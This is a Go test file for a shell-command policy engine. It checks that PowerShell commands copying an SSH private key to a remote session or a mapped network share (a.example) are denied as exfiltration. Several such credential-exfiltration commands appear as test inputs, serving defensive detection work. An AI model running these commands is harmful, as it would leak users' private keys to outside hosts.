package policy_test

// ===========================================================================
// Pass 63 decisions: Findings 97 and 98
// ===========================================================================

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding097SessionCopyIsDenied pins the decision level of F97: a policy
// that denies exfiltration admitted `Copy-Item … -ToSession $s`, because a
// remote session was modelled as a local destination — the report carried the
// read and the write, no NetEgress, and an empty exfilPairs, so neither the
// `exfiltration` rule nor a network rule fired.
func TestFinding097SessionCopyIsDenied(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	netDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindNetEgress: policy.Deny,
	}}
	for _, src := range []string{
		`Copy-Item C:\Users\me\.ssh\id_rsa -ToSession $s`,
		`Copy-Item -Path C:\Users\me\.ssh\id_rsa -Destination C:\x -ToSession $s`,
	} {
		rep := analyzeOK(t, api.LangPowerShell, src)
		mustDecide(t, exfilDeny, rep, policy.Deny, src+" (exfil deny)")
		mustDecide(t, netDeny, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (net deny)")
		mustDecide(t, policy.Config{}, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (default policy)")
	}

	// Precision: a local copy and a non-credential session copy stay allowed —
	// the session is a channel, not an automatic exfiltration.
	for _, src := range []string{
		`Copy-Item C:\a C:\b`,
		`Copy-Item C:\Users\me\notes.txt -ToSession $s`,
	} {
		mustDecide(t, policy.Config{}, analyzeOK(t, api.LangPowerShell, src), policy.Allow, src+" (control)")
	}
}

// TestFinding098MappedShareIsDenied pins the decision level of F98: a drive
// mounted on a UNC root made every later write under its letter look local, so
// a credential copied to the share formed no pair and `Exfiltration: Deny`
// allowed it while the bare UNC destination was denied.
func TestFinding098MappedShareIsDenied(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	netDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindNetEgress: policy.Deny,
	}}
	for _, src := range []string{
		`New-PSDrive -Name X -PSProvider FileSystem -Root \\a.example\share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
		`New-PSDrive X FileSystem \\a.example\share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
		`New-PSDrive -Name X -Root //a.example/share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (exfil deny)")
		mustDecide(t, netDeny, analyzeOK(t, api.LangPowerShell, src), policy.Deny, src+" (net deny)")
	}

	// Precision: a drive mounted on a local root is not a network sink, and an
	// unmapped letter stays a local path.
	for _, src := range []string{
		`New-PSDrive -Name X -Root C:\local; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
		`Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangPowerShell, src), policy.Allow, src+" (control)")
		mustDecide(t, netDeny, analyzeOK(t, api.LangPowerShell, src), policy.Allow, src+" (net control)")
	}
}
